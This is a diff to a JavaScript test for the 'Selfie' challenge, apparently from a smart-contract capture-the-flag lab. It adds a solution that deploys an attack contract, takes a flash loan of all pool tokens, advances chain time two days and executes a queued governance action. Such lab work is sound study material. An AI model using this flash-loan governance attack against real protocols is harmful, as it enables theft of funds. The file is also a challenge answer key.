@@ -30,6 +30,15 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
+        const HackGovernanceFactory = await ethers.getContractFactory('HackGovernance', deployer);
+        this.HackGovernance = await HackGovernanceFactory.deploy(this.governance.address, this.pool.address);
+
+        await this.HackGovernance.connect(attacker).callFlashLoan(TOKENS_IN_POOL);
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        await this.governance.connect(attacker).executeAction(1);
+
         /** CODE YOUR EXPLOIT HERE */
     });
 
